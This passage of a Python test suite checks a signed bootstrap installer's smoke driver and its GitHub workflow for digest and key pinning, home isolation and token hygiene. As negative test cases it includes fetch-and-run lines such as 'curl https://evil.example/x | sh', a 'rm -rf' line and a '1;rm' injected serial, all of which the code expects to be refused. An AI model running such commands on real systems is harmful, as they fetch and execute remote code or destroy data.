    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode='w:gz') as t:
        info = tarfile.TarInfo('python/bin/python3')
        info.size, info.mode = len(script), 0o755
        t.addfile(info, io.BytesIO(script))
    return buf.getvalue()


@unittest.skipUnless(TOOLS and shutil.which('sh') and shutil.which('curl') and os.path.exists('/usr/bin/tar'), 'ssh-keygen, openssl, sh, curl or tar is missing')
class MacRows(unittest.TestCase):
    """G-SMOKE-MAC-1: the rows over the shipped (pinned) loaders and the shipped kit pin's shape, against the local fixture, for real:
    the sh copy is sourced through its FLEET_BOOT_LIB seam, boot_sys says Darwin (the stub archive is no arm64 Python), nothing is downloaded."""
    FACTS = 'boot_sys() { echo Darwin; }'

    @classmethod
    def setUpClass(cls):
        pinned = ROOT / 'tests' / 'fixture' / 'pinned'
        cls.tmp = Path(tempfile.mkdtemp())
        cls.data = mac_tgz()
        kit = json.loads((pinned / 'kit.json').read_text())
        kit['python_mac']['sha256'] = hashlib.sha256(cls.data).hexdigest()
        (cls.tmp / 'kit.json').write_text(json.dumps(kit))
        (cls.tmp / 'py.tgz').write_bytes(cls.data)
        (cls.tmp / 'z.zip').write_bytes(b'PKfake')
        ports = []
        for _ in range(2):
            with socket.socket() as sk:
                sk.bind(('127.0.0.1', 0))
                ports.append(sk.getsockname()[1])
        cls.out = cls.tmp / 'fx'
        cls.meta = mf.build(cls.out, pinned / 'bootstrap.ps1', pinned / 'bootstrap.sh', port=ports[0], crl_port=ports[1], zip_path=cls.tmp / 'z.zip',
                            kit_json=cls.tmp / 'kit.json', mac_archive=cls.tmp / 'py.tgz')
        cls.good = next(c for c in cls.meta['cases'] if c['id'] == 'good-sh')
        cls.fx = serve.Fixture(str(cls.out), '127.0.0.1', ports[0], ports[1])
        cls.env = mock.patch.dict(os.environ, {'CURL_CA_BUNDLE': str(cls.out / 'tls' / 'ca.crt')})
        cls.env.start()
        cls.addClassCleanup(cls.env.stop)
        cls.addClassCleanup(cls.fx.close)
        cls.addClassCleanup(shutil.rmtree, cls.tmp, ignore_errors=True)
        if subprocess.run([sd.curl(), '-fsS', '--max-time', '20', '-o', os.devnull, f'https://127.0.0.1:{ports[0]}/ping']).returncode != 0:
            raise unittest.SkipTest('this curl does not take CURL_CA_BUNDLE')

    def row(self, name, facts=FACTS):
        return sd.run_mac(name, str(self.out), self.fx, self.good, facts)

    def test_the_good_row_makes_one_archive_get_and_python_ok_passes(self):
        bad, out = self.row('python-mac-good')
        self.assertEqual(bad, [], out)
        self.assertEqual([sd.logical(e['path']) for e in self.fx.log], ['python-mac', None])   # the 302 and its object hop: one logical request
        self.assertEqual([e['status'] for e in self.fx.log], [302, 200])
        self.assertTrue(all(e['tls'] in ('TLSv1.2', 'TLSv1.3') and e['ua'].startswith('curl/') for e in self.fx.log))
        self.assertIn('mac-row python_ok', out)

    def test_the_null_row_is_python_lock_with_no_request(self):
        bad, out = self.row('python-mac-null')
        self.assertEqual((bad, self.fx.log), ([], []), out)
        self.assertIn('REFUSED python-lock', out)

    def test_the_hash_row_is_python_hash_after_one_request(self):
        bad, out = self.row('python-mac-hash')
        self.assertEqual(bad, [], out)
        self.assertIn('REFUSED python-hash', out)
        self.assertEqual(len(self.fx.log), 2)

    def test_all_three_rows_are_run_and_counted(self):
        with contextlib.redirect_stdout(io.StringIO()) as shown:
            self.assertEqual(sd.run_mac_rows(str(self.out), self.meta, self.fx, True, self.FACTS), 0)
        self.assertIn('3/3 python-mac rows as expected', shown.getvalue())

    def test_a_row_that_stops_before_fetch_python_is_red(self):  # the control: a skipped row never reads as green
        for name in sd.MAC_WANT:
            bad, _ = self.row(f'python-mac-{name}', facts='exit 0')
            self.assertIn('the row never reached fetch_python', bad, name)
        with contextlib.redirect_stdout(io.StringIO()):
            self.assertEqual(sd.run_mac_rows(str(self.out), self.meta, self.fx, True, 'exit 0'), 3)

    def test_an_archive_that_is_not_the_pin_is_not_a_pass(self):  # the good row against the hash row's folder is python-hash, so it is red
        self.fx.set_case('python-mac-hash')
        out = subprocess.run(['sh', '-c', sd.MAC_SCRIPT, 'sh', str(self.out / 'good-sh' / 'run' / 'bootstrap.sh'),
                              str(self.out / 'good-sh' / 'release' / 'install-20' / 'kit.json'), self.FACTS], capture_output=True, text=True,
                             env=dict(os.environ, TMPDIR=str(self.tmp)))
        self.assertEqual(out.returncode, 1)
        self.assertNotEqual(sd.judge_mac('good', out.stdout, out.returncode, list(self.fx.log), [], []), [])

    def test_a_loader_that_cannot_unpack_what_it_fetched_is_python_install_not_a_pass(self):
        self.assertEqual(sd.MAC_WANT['good'], (None, ['python-mac']))
        junk = mac_tgz()[:40]   # a cut archive whose hash the kit nevertheless pins
        kit = json.loads((self.out / 'good-sh' / 'release' / 'install-20' / 'kit.json').read_text())
        kit['python_mac']['sha256'] = hashlib.sha256(junk).hexdigest()
        rel = Path('pbs') / 'releases' / 'download' / '20260929' / kit['python_mac']['url'].rsplit('/', 1)[1]
        (self.out / 'python-mac-cut' / rel).parent.mkdir(parents=True)
        (self.out / 'python-mac-cut' / rel).write_bytes(junk)
        (self.tmp / 'cut.json').write_text(json.dumps(kit))
        self.fx.set_case('python-mac-cut')
        done = subprocess.run(['sh', '-c', sd.MAC_SCRIPT, 'sh', str(self.out / 'good-sh' / 'run' / 'bootstrap.sh'), str(self.tmp / 'cut.json'), self.FACTS],
                              capture_output=True, text=True, env=dict(os.environ, TMPDIR=str(self.tmp)))
        self.assertIn('REFUSED python-install', done.stdout)

    def run_pinned_stub(self, name, script):
        """MAC_SCRIPT over a case folder whose pinned archive holds `script` as its python3 and a kit.json that pins that archive's sha256."""
        data = mac_tgz(script)
        kit = json.loads((self.out / 'good-sh' / 'release' / 'install-20' / 'kit.json').read_text())
        kit['python_mac']['sha256'] = hashlib.sha256(data).hexdigest()
        rel = Path('pbs') / 'releases' / 'download' / '20260929' / kit['python_mac']['url'].rsplit('/', 1)[1]
        (self.out / name / rel).parent.mkdir(parents=True)
        (self.out / name / rel).write_bytes(data)
        (self.tmp / f'{name}.json').write_text(json.dumps(kit))
        self.fx.set_case(name)
        return subprocess.run(['sh', '-c', sd.MAC_SCRIPT, 'sh', str(self.out / 'good-sh' / 'run' / 'bootstrap.sh'), str(self.tmp / f'{name}.json'), self.FACTS],
                              capture_output=True, text=True, env=dict(os.environ, TMPDIR=str(self.tmp)))

    def test_a_python_that_fails_python_ok_turns_the_good_row_red(self):  # the control for the marker: python_ok's verdict, not just its text, is judged
        msg = 'python_ok refused the fetched Python (3.12+ with zstd)'
        stubs = {'python-mac-broken': b'#!/bin/sh\nexit 1\n',  # fails every probe
                 'python-mac-nover': b'#!/bin/sh\ncase "$3" in *version_info*) exit 1 ;; esac\nexit 0\n',  # fails only the 3.12+ probe, so only that line of python_ok can turn it red
                 'python-mac-nozstd': b'#!/bin/sh\ncase "$3" in *zstd*) exit 1 ;; esac\nexit 0\n'}  # passes it, fails only the Darwin-only zstd line
        for name, script in stubs.items():
            done = self.run_pinned_stub(name, script)
            self.assertEqual(done.returncode, 0, (name, done.stdout, done.stderr))
            self.assertIn('mac-row python_ok refused', done.stdout, name)
            self.assertNotIn('mac-row python_ok\n', done.stdout, name)
            self.assertIn(msg, sd.judge_mac('good', done.stdout, done.returncode, list(self.fx.log), [], []), name)
        # and the same rows with a passing stub print the plain marker and judge clean of this message
        ok = self.run_pinned_stub('python-mac-okstub', b'#!/bin/sh\nexit 0\n')
        self.assertIn('mac-row python_ok\n', ok.stdout)
        self.assertNotIn(msg, sd.judge_mac('good', ok.stdout, ok.returncode, list(self.fx.log), [], []))


# --- PY13: smoke_driver.py real, over a fake gh; smoke-real.yml's shape ---------------------------------------------------------------

REAL_WF = (ROOT / '.github' / 'workflows' / 'smoke-real.yml').read_text()


def publisher():
    spec = importlib.util.spec_from_file_location('fleet_install_publish_for_smoke', ROOT / 'bin' / 'fleet-install-publish.py')
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


FAKE_GH = """#!{python}
import os, shutil, sys
a = sys.argv[1:]
d = os.environ['FAKE_REL']
with open(os.path.join(d, 'calls.log'), 'a') as f:
    f.write(' '.join(a) + '\\n')
if a[:2] == ['release', 'view'] and a[2] == os.environ['FAKE_TAG']:
    sys.stdout.write(open(os.path.join(d, 'notes.md')).read())
elif a[:2] == ['release', 'download'] and a[2] == os.environ['FAKE_TAG']:
    shutil.copy(os.path.join(d, a[a.index('--pattern') + 1]), a[a.index('--output') + 1])
else:
    sys.exit(2)
"""


@unittest.skipUnless(os.name == 'posix' and shutil.which('sh'), 'the fake line runs under sh')
class RealMode(unittest.TestCase):
    """`smoke_driver.py real` over a fake `gh` that serves one release: the notes, the bootstrap asset, and nothing it may write."""
    SERIAL, MIN = 7, 3
    KEY = 'SHA256:' + 'K' * 43
    CODE = 'Your code: ABCDE 23456 FGHJK MNPQR STVWX YZ012 34567 89ABC'

    def setUp(self):
        self.t = Path(tempfile.mkdtemp())
        self.addCleanup(shutil.rmtree, self.t, True)
        self.rel, self.outside = self.t / 'rel', self.t / 'outside'
        self.rel.mkdir()
        self.outside.mkdir()
        self.asset = b'#!/bin/sh\n# a bootstrap\n'
        self.sha = hashlib.sha256(self.asset).hexdigest()
        self.gh = self.t / 'gh'
        self.gh.write_text(FAKE_GH.format(python=sys.executable))
        self.gh.chmod(0o755)
        self.install_yml = self.t / 'install.yml'
        self.set_main_key(self.KEY)
        self.pins = self.t / 'pins.json'
        self.set_main_pin(self.sha)
        self.publish()
        patches = (mock.patch.dict(os.environ, {'FAKE_REL': str(self.rel), 'FAKE_TAG': f'install-{self.SERIAL}'}),
                   mock.patch.object(sd.platform, 'system', return_value='Darwin'), mock.patch.object(sd, 'machine', return_value=None),
                   mock.patch.object(sd, 'watch_roots', return_value=[str(self.outside)]),
                   mock.patch.object(sd, 'expected_line', side_effect=lambda *a: self.shown))   # the fake line is its own template here
        for p in patches:
            p.start()
            self.addCleanup(p.stop)

    def set_main_key(self, fp):
        self.install_yml.write_text(f'env:\n  # a comment\n  KEY_SHA256: {fp}\n  SERIES: test\n')

    def set_main_pin(self, sha, serial=None):
        self.pins.write_text(json.dumps({str(serial or self.SERIAL): {'ps1': sha, 'sh': sha}}))

    def good_line(self, tail='', out=None):
        """What a mac line is made of for this test: the asset url and the flags where the shape check looks, then the output a check prints."""
        out = out if out is not None else [f'bootstrap sha256 {self.sha}', f'key {self.KEY}', f'serial {self.SERIAL} valid_until 2026-12-01T00:00:00Z', self.CODE]
        url = f'https://github.com/org/repo/releases/download/install-{self.SERIAL}/bootstrap.sh'
        shown = '; '.join("echo '%s'" % x for x in out)
        return f"{shown}; : '{url}' {self.sha} --serial {self.SERIAL} --min-serial {self.MIN}; {tail}"

    def publish(self, line=None, key=None, notes_sha=None, asset=None, drop_os=None, notes=None):
        sha = notes_sha or self.sha
        self.shown = line or self.good_line()
        blocks = ''.join(f'\n{o} (bootstrap sha256 {sha}):\n```\n{line or self.good_line()}\n```' for o in ('win', 'mac', 'ubuntu') if o != drop_os)
        (self.rel / 'notes.md').write_text(notes if notes is not None else
                                           f'Signed install set install-{self.SERIAL}. Verify it.\nkey {key or self.KEY}\nserial {self.SERIAL}, valid_until T\n{blocks}')
        (self.rel / 'bootstrap.sh').write_bytes(self.asset if asset is None else asset)

    def real(self, *extra, os_name='mac'):
        argv = ['real', '--serial', str(self.SERIAL), '--os', os_name, '--repo', 'org/repo', '--gh', str(self.gh), '--pins', str(self.pins),
                '--install-yml', str(self.install_yml), *extra]
        with contextlib.redirect_stdout(io.StringIO()) as out:
            rc = sd.main(argv)
        return rc, out.getvalue()

    def calls(self):
        return (self.rel / 'calls.log').read_text().splitlines() if (self.rel / 'calls.log').exists() else []

    def sentinel(self):
        """A line that leaves this file, so a test can tell whether the line ran."""
        return self.t / 'ran'

    def test_a_release_that_matches_main_passes_and_reads_only(self):
        self.publish(line=self.good_line(f'echo > {self.sentinel()}'))
        rc, out = self.real()
        self.assertEqual((rc, out.splitlines()[-1] if rc else ''), (0, ''), out)
        self.assertTrue(self.sentinel().exists())
        self.assertEqual({c.split()[1] for c in self.calls()}, {'view', 'download'})  # the only two calls, both reads
        self.assertTrue(all(c.startswith('release ') and '--repo org/repo' in c for c in self.calls()))

    def refused(self, code, **kw):
        rc, out = self.real(**kw)
        self.assertEqual(rc, 1, out)
        self.assertTrue(out.startswith(f'REFUSED {code}\n'), out)
        self.assertFalse(self.sentinel().exists(), 'the line ran')
        return out

    def test_a_bootstrap_digest_that_differs_from_mains_refuses_before_running(self):
        self.publish(line=self.good_line(f'echo > {self.sentinel()}'))
        self.set_main_pin('c' * 64)
        self.refused('digest-mismatch')

    def test_a_release_whose_notes_and_asset_agree_with_each_other_but_not_with_main_still_refuses(self):  # the control: not a re-read
        other = b'#!/bin/sh\n# another bootstrap\n'
        osha = hashlib.sha256(other).hexdigest()
        self.publish(line=self.good_line(f'echo > {self.sentinel()}').replace(self.sha, osha), notes_sha=osha, asset=other)
        self.refused('digest-mismatch')  # main still pins self.sha

    def test_the_asset_alone_differing_from_the_notes_and_main_refuses(self):
        self.publish(line=self.good_line(f'echo > {self.sentinel()}'), asset=b'tampered')
        self.refused('digest-mismatch')

    def test_a_notes_digest_alone_differing_refuses(self):
        self.publish(line=self.good_line(f'echo > {self.sentinel()}'), notes_sha='d' * 64)
        self.refused('digest-mismatch')

    def test_a_key_fingerprint_that_differs_from_mains_refuses_before_running(self):
        self.publish(line=self.good_line(f'echo > {self.sentinel()}'), key='SHA256:' + 'X' * 43)
        self.refused('key-mismatch')

    def test_a_release_whose_notes_and_line_agree_on_a_key_main_does_not_trust_still_refuses(self):
        other = 'SHA256:' + 'Z' * 43
        self.publish(line=self.good_line(f'echo > {self.sentinel()}', [f'bootstrap sha256 {self.sha}', f'key {other}']), key=other)
        self.refused('key-mismatch')  # main still trusts self.KEY

    def test_no_pin_on_main_for_the_serial_stops_and_never_reads_the_release(self):
        self.publish(line=self.good_line(f'echo > {self.sentinel()}'))
        self.set_main_pin(self.sha, serial=self.SERIAL + 1)
        self.refused('no-main-pin')
        self.assertEqual(self.calls(), [])  # the release was not even read
        self.pins.unlink()
        self.refused('no-main-pin')
        self.pins.write_text('{"%d": {"sh": "%s", "sh": "%s"}}' % (self.SERIAL, self.sha, self.sha))  # a key twice is not a pin
        self.refused('no-main-pin')
        self.pins.write_text(json.dumps({str(self.SERIAL): {'sh': self.sha.upper()}}))
        self.refused('no-main-pin')

    def test_no_single_key_constant_on_main_stops(self):
        self.install_yml.write_text('env:\n  OTHER: 1\n')
        self.refused('no-main-key')
        self.install_yml.write_text(f'env:\n  KEY_SHA256: {self.KEY}\n  KEY_SHA256: {self.KEY}\n')
        self.refused('no-main-key')
        self.install_yml.write_text('env:\n  KEY_SHA256: SHA256:NOT-SET-fill-in-after-keygen\n')
        self.refused('no-main-key')

    def test_a_missing_os_line_fails_naming_the_os(self):
        for name in ('win', 'mac', 'ubuntu'):
            self.publish(drop_os=name)
            out = self.refused('no-line', os_name=name)
            self.assertIn(f'for {name}.', out)

    def test_notes_that_are_not_the_publishers_shape_refuse(self):
        good = (self.rel / 'notes.md').read_text()
        for why, text in {'no key line': good.replace(f'key {self.KEY}\n', ''), 'two key lines': good.replace('\nserial', f'\nkey {self.KEY}\nserial', 1),
                          'no fence': good.replace(f'mac (bootstrap sha256 {self.sha}):\n```\n', f'mac (bootstrap sha256 {self.sha}):\n', 1), 'two mac blocks': good + '\n' + good[good.index('mac ('):]}.items():
            self.publish(notes=text)
            with self.subTest(why):
                self.refused('notes')

    def test_a_line_for_another_release_refuses(self):
        for why, line in {'another serial': self.good_line().replace(f'install-{self.SERIAL}/', 'install-8/'),
                          'another repo': self.good_line().replace('org/repo', 'evil/repo'),
                          'no digest': self.good_line().replace(self.sha, 'f' * 64),
                          'serial flag': self.good_line().replace(f'--serial {self.SERIAL}', '--serial 70'),
                          'two lines': self.good_line() + '\nrm -rf x'}.items():
            with self.subTest(why):
                self.publish(line=line)
                if why == 'two lines':  # a newline cannot sit inside a one-line fence: the notes shape fails first
                    self.refused('notes')
                else:
                    self.refused('line')
        self.publish()
        rc, out = self.real('--min-serial', '4')  # the min serial asked for is held against the line's
        self.assertTrue(rc == 1 and out.startswith('REFUSED line'), out)

    def test_a_failed_read_of_the_release_refuses_fetch(self):
        with mock.patch.dict(os.environ, {'FAKE_TAG': 'install-999'}):
            self.refused('fetch')

    def fails(self, line, want):
        self.publish(line=line)
        rc, out = self.real()
        self.assertEqual(rc, 1, out)
        self.assertIn(want, out)
        self.assertIn('FAIL real install-', out)
        return out

    def test_a_run_that_wrote_a_file_outside_the_throwaway_home_fails(self):
        out = self.fails(self.good_line(f'echo x > {self.outside}/stray'), 'wrote outside the throwaway home')
        self.assertIn(str(self.outside / 'stray'), out)

    def test_a_run_that_writes_only_inside_its_home_and_temp_passes_if_it_cleans_the_temp(self):
        self.publish(line=self.good_line('echo x > "$HOME/note"; echo x > "$TMPDIR/f"; rm "$TMPDIR/f"'))
        rc, out = self.real()
        self.assertEqual(rc, 0, out)
        self.assertIn("made in the throwaway home: ['note']", out)

    def test_the_run_sees_a_throwaway_home_not_the_real_one(self):
        real_home = os.path.expanduser('~')
        self.publish(line=self.good_line(f'[ "$HOME" != {real_home} ] && [ "$TMPDIR" != {tempfile.gettempdir()} ] && echo > {self.t}/home-ok'))
        self.assertEqual(self.real()[0], 0)
        self.assertTrue((self.t / 'home-ok').exists())

    def test_every_temp_and_home_variable_the_line_sees_is_the_throwaway_one(self):
        """TMPDIR is what mktemp -d reads on the Mac and Ubuntu lines, TEMP what the Windows line reads: each is recorded by the line,
        under a real TMPDIR the driver must replace, and compared by realpath (a trailing slash is not a different folder)."""
        real_tmp = self.t / 'real-tmp'
        real_tmp.mkdir()
        got = self.t / 'vars'
        self.publish(line=self.good_line(f'printf "%s\\n" "$HOME" "$TMPDIR" "$TMP" "$TEMP" > {got}'))
        with mock.patch.dict(os.environ, {'TMPDIR': str(real_tmp) + '/', 'TMP': str(real_tmp), 'TEMP': str(real_tmp)}):
            self.assertEqual(self.real()[0], 0)
        home, *temps = got.read_text().splitlines()
        real = lambda p: os.path.realpath(p)   # noqa: E731
        self.assertNotEqual(real(home), real(os.path.expanduser('~')))
        for name, v in zip(('TMPDIR', 'TMP', 'TEMP'), temps):
            with self.subTest(name):
                self.assertNotEqual(real(v), real(real_tmp))
                self.assertNotEqual(real(v), real(tempfile.gettempdir()))
                self.assertEqual(os.path.basename(v), 'tmp')   # the driver's own folder, a sibling of the throwaway home
                self.assertEqual(os.path.dirname(v), os.path.dirname(home))
        self.assertEqual(len(set(temps)), 1)

    def test_a_temp_folder_left_behind_fails(self):
        self.fails(self.good_line('mkdir "$TMPDIR/fleet-boot.left"'), 'temp folder left')

    def test_the_runners_token_never_reaches_the_release_line(self):
        self.publish(line=self.good_line(f'echo "[$GH_TOKEN][$GITHUB_TOKEN]" > {self.t}/tok'))
        with mock.patch.dict(os.environ, {'GH_TOKEN': 'tok-a', 'GITHUB_TOKEN': 'tok-b'}):
            self.assertEqual(self.real()[0], 0)
        self.assertEqual((self.t / 'tok').read_text(), '[][]\n')

    def test_the_printed_digest_and_key_must_be_mains(self):
        for why, out in {'digest': [f'bootstrap sha256 {"e" * 64}', f'key {self.KEY}'], 'key': [f'bootstrap sha256 {self.sha}', f'key SHA256:{"Q" * 43}']}.items():
            with self.subTest(why):
                self.fails(self.good_line(out=[*out, f'serial {self.SERIAL} valid_until T', self.CODE]), 'info lines')

    def test_a_missing_serial_line_or_code_line_or_a_non_zero_exit_fails(self):
        base = [f'bootstrap sha256 {self.sha}', f'key {self.KEY}', f'serial {self.SERIAL} valid_until T', self.CODE]
        self.fails(self.good_line(out=base[:2] + [self.CODE]), 'info lines')
        self.fails(self.good_line(out=[*base[:2], 'serial 9 valid_until T', self.CODE]), 'info lines')   # another serial's document is not this release
        self.fails(self.good_line(out=[*base[:2], 'serial 77 valid_until T', self.CODE]), 'info lines')
        self.fails(self.good_line(out=base[:3]), 'no `Your code:` line')
        self.fails(self.good_line('exit 3'), 'exit 3, want 0')

    def test_a_refusal_the_machine_earns_is_expected_and_a_wrong_one_is_not(self):
        refused = ['REFUSED os', 'This machine is not supported.']
        self.publish(line=self.good_line('exit 1', out=refused))
        with mock.patch.object(sd, 'machine', return_value='os'):
            self.assertEqual(self.real()[0], 0)
            self.assertEqual(self.real('--must-run')[0], 1)  # a vacuous pass: this runner must reach the check
        self.fails(self.good_line('exit 1', out=refused), 'info lines')  # a machine that is not refused must not print it

    def test_a_machine_that_refuses_must_print_no_info_line(self):
        info = [f'bootstrap sha256 {self.sha}', f'key {self.KEY}', f'serial {self.SERIAL} valid_until T']
        self.publish(line=self.good_line('exit 1', out=[*info, 'REFUSED os', 'This machine is not supported.']))
        with mock.patch.object(sd, 'machine', return_value='os'):
            rc, out = self.real()
        self.assertEqual(rc, 1, out)
        self.assertIn('info lines', out)
        self.assertIn('want none', out)

    def test_a_line_that_does_not_finish_fails(self):
        self.publish(line=self.good_line('exec sleep 30'))
        with mock.patch.object(sd, 'RUN_TIMEOUT', 0.5):
            rc, out = self.real()
        self.assertEqual(rc, 1, out)
        self.assertIn('did not finish in 0.5 s', out)
        self.assertIn('FAIL real install-', out)

    def test_the_serial_is_digits_only(self):
        for bad in ('', '007', '-1', '1;rm', '1 2', '99999999999', '٣'):
            with self.subTest(bad), contextlib.redirect_stderr(io.StringIO()), self.assertRaises(SystemExit):
                sd.main(['real', '--serial', bad])

    def test_a_linux_run_wants_the_kernel_warning_before_the_code(self):
        out = [f'bootstrap sha256 {self.sha}', f'key {self.KEY}', f'serial {self.SERIAL} valid_until T']
        with mock.patch.object(sd.platform, 'system', return_value='Linux'), mock.patch.object(sd.os, 'access', return_value=True):
            self.publish(line=self.good_line(out=[*out, self.CODE]))
            rc, text = self.real(os_name='ubuntu')
            self.assertEqual(rc, 1, text)
            self.assertIn('no kernel warning before the code', text)
            self.publish(line=self.good_line(out=[*out, 'warning: Firecracker supports host kernels 5.10 and 6.1', self.CODE]))
            self.assertEqual(self.real(os_name='ubuntu')[0], 0)

    def test_the_committed_main_side_values_are_readable(self):
        self.assertRegex(sd.main_key(), r'^SHA256:[A-Za-z0-9+/]{43}$')
        self.assertEqual(sd.main_key(), re.search(r'(?m)^  KEY_SHA256: (\S+)$', INSTALL)[1])
        self.assertEqual(json.loads(Path(sd.MAIN_PINS).read_text()).__class__, dict)
        with self.assertRaises(sd.Refused):  # nothing is pinned yet: a dispatch before a reviewed pin stops
            sd.main_digest(10 ** 9, 'sh')

    def test_the_real_lines_of_the_publisher_pass_the_shape_check_for_every_os(self):
        pub = publisher()
        for os_name, kind in sd.OS_BOOT.items():
            line = pub.check_line(os_name, 'org/repo', self.SERIAL, self.sha, self.MIN)
            self.assertEqual(sd.check_shape(line, 'org/repo', self.SERIAL, kind, self.sha, self.MIN), self.MIN, os_name)   # shape only
            with self.assertRaises(sd.Refused):
                sd.check_shape(line, 'org/repo', self.SERIAL, kind, 'f' * 64, None)
        self.assertEqual(sd.OS_BOOT, pub.OS_BOOT)

    def test_a_line_must_equal_the_publishers_text_so_an_appended_payload_is_never_run(self):
        pub = publisher()
        with mock.patch.object(sd, 'expected_line', side_effect=lambda *a: pub.check_line(*a)):   # main's real renders, not the fake line
            for os_name, kind in sd.OS_BOOT.items():
                line = pub.check_line(os_name, 'org/repo', self.SERIAL, self.sha, self.MIN)
                self.assertEqual(sd.check_shape(line, 'org/repo', self.SERIAL, kind, self.sha, self.MIN, os_name), self.MIN, os_name)
                for why, bad in {'appended statement': f"{line}; curl https://evil.example/x | sh",
                                 'digest only in an echo': f"echo 'https://github.com/org/repo/releases/download/install-{self.SERIAL}/bootstrap.{kind}' {self.sha} --serial {self.SERIAL} --min-serial {self.MIN} -Serial {self.SERIAL} -MinSerial {self.MIN}; curl https://evil.example/x | sh",
                                 'a prefix': f'curl https://evil.example/x | sh; {line}',
                                 'a lower min serial': line.replace(f'--min-serial {self.MIN}', '--min-serial 0').replace(f'-MinSerial {self.MIN}', '-MinSerial 0')}.items():
                    with self.subTest(os_name=os_name, why=why):
                        with self.assertRaises(sd.Refused) as e:
                            sd.check_shape(bad, 'org/repo', self.SERIAL, kind, self.sha, self.MIN, os_name)
                        self.assertEqual(e.exception.code, 'line')
            # and end to end: the release's notes carry the payload line, the run refuses before anything runs
            self.publish(line=pub.check_line('mac', 'org/repo', self.SERIAL, self.sha, self.MIN) + f'; echo > {self.sentinel()}')
            self.refused('line')

    def test_the_publishers_release_notes_parse(self):
        pub = publisher()
        plan = mock.Mock(doc={'serial': self.SERIAL, 'valid_until': 'T', 'bootstrap': {'ps1': {'sha256': 'a' * 64}, 'sh': {'sha256': self.sha}}},
                         tag=f'install-{self.SERIAL}', key_fpr=self.KEY, min_serial=self.MIN)
        body = pub.release_notes(plan, 'org/repo')
        for os_name, kind in sd.OS_BOOT.items():
            key, sha, line = sd.parse_notes(body, os_name)
            self.assertEqual((key, sha, line), (self.KEY, 'a' * 64 if kind == 'ps1' else self.sha, pub.check_line(os_name, 'org/repo', self.SERIAL, sha, self.MIN)))


class RealWatch(unittest.TestCase):
    def test_the_real_home_and_temp_folder_are_watched_by_default(self):
        self.assertEqual(sd.watch_roots(), [os.path.expanduser('~'), tempfile.gettempdir()])

    def test_a_path_an_install_would_write_counts_when_it_appears(self):
        with tempfile.TemporaryDirectory() as t:
            before = sd.snapshot([t])
            (Path(t) / 'new').write_text('x')
            self.assertEqual(sd.snapshot([t]) - before, {str(Path(t) / 'new')})
            with mock.patch.object(sd.os.path, 'lexists', side_effect=lambda p: p == sd.FIXED_PATHS[0]):
                self.assertIn(sd.FIXED_PATHS[0], sd.snapshot([t]))
            self.assertEqual(sd.snapshot([str(Path(t) / 'absent')]) - {p for p in sd.FIXED_PATHS if os.path.lexists(p)}, set())


class RealWorkflow(unittest.TestCase):
    def test_permissions_secrets_and_the_one_trigger(self):
        self.assertRegex(REAL_WF, r'(?m)^permissions:\n  contents: read\n')
        self.assertNotRegex(REAL_WF, r'(?m)^\s+(contents|id-token|actions|pull-requests|packages): write')
        for bad in ('secrets.', 'pull_request_target', 'actions/cache', 'self-hosted', 'environment:'):
            self.assertNotIn(bad, REAL_WF)
        on = re.search(r'(?ms)^on:\n(.*?)(?=^\S)', REAL_WF)[1]
        self.assertEqual(re.findall(r'(?m)^  (\S+):', on), ['workflow_dispatch'])   # the dispatch and nothing else
        self.assertEqual(re.findall(r'(?m)^      (\S+):', on), ['serial'])

    def test_actions_are_sha_pinned_and_checkouts_keep_no_credentials(self):
        uses = re.findall(r'uses: (\S+)', REAL_WF)
        self.assertEqual(len(uses), 2)
        for u in uses:
            self.assertRegex(u, r'^actions/[a-z-]+@[0-9a-f]{40}$')
        self.assertEqual(REAL_WF.count('persist-credentials: false'), REAL_WF.count('actions/checkout@'))
        for u in uses:   # the same pins as the other workflows use
            self.assertIn(u, INSTALL)

    def test_every_job_has_a_timeout_and_no_expression_is_in_a_script(self):
        self.assertGreaterEqual(REAL_WF.count('runs-on:'), 1)
        self.assertEqual(REAL_WF.count('runs-on:'), REAL_WF.count('timeout-minutes:'))
        for m in re.finditer(r'(?ms)^\s*(?:- )?run:(.*?)(?=^\s*(?:- )?\w[\w-]*:|\Z)', REAL_WF):
            self.assertNotIn('${{', m[1])

    ROW = r'(?m)^          - runner: ([\w.-]+)(?: +#.*)?\n            os: (\w+)\n(?:            trust: [\w-]+\n)?            must_run: (true|false)\n'

    def test_the_runners_are_the_gates_and_it_runs_only_from_main_over_main(self):
        legs = lambda t: re.findall(r'(?m)^          - runner: (\S+)', t)   # noqa: E731
        self.assertEqual(legs(REAL_WF), legs(SMOKE))
        self.assertIn('          ref: main\n', REAL_WF)
        self.assertIn('python tests/fixture/smoke_driver.py real --serial "$SERIAL" --os "$BOOT_OS" --repo "$REPO" "${flag[@]}"', REAL_WF)
        self.assertIn('[[ $SERIAL =~ $re ]]', REAL_WF)
        self.assertIn("re='^(0|[1-9][0-9]{0,9})$'", REAL_WF)
        self.assertIn('${{ inputs.serial }}', REAL_WF)
        self.assertNotIn('inputs.serial', re.sub(r'(?m)^          SERIAL: .*$', '', REAL_WF))   # the input reaches the script through env only

    def test_each_leg_is_as_strict_as_the_release_gates_leg(self):  # a must_run: false on a real leg would pass it vacuously on a machine refusal
        mine, gate = re.findall(self.ROW, REAL_WF), re.findall(self.ROW, SMOKE)
        self.assertEqual(len(gate), 5)
        self.assertEqual([(r, m) for r, _, m in mine], [(r, m) for r, _, m in gate])
        self.assertEqual(REAL_WF.count('          - runner:'), len(mine))   # no row in another shape
        self.assertEqual([r for r, _, m in mine if m == 'false'], ['ubuntu-22.04'])

    def test_a_dispatch_from_another_branch_fails_and_never_skips_green(self):
        self.assertNotRegex(REAL_WF, r'(?m)^\s+if: ')   # a skipped job shows green with no case run
        guard = re.search(r'(?ms)^  guard:[^\n]*\n(.*?)(?=^  \w[\w-]*:\n|\Z)', REAL_WF)[1]
        self.assertIn('runs-on: ubuntu-24.04\n', guard)   # never a macOS or Windows minute just to say no
        self.assertIn('REF: ${{ github.ref }}\n', guard)
        self.assertIn('[ "$REF" = refs/heads/main ] || {', guard)
        self.assertIn('exit 1;', guard)
        self.assertNotIn('${{', re.search(r'(?ms)run: \|\n(.*)', guard)[1])
        self.assertIn('    needs: guard\n', REAL_WF)
        bash = shutil.which('bash')
        if bash:
            script = re.search(r'(?ms)run: \|\n(.*)', guard)[1]
            for ref, rc in (('refs/heads/main', 0), ('refs/heads/other', 1), ('refs/pull/1/merge', 1), ('', 1)):
                with self.subTest(ref=ref):
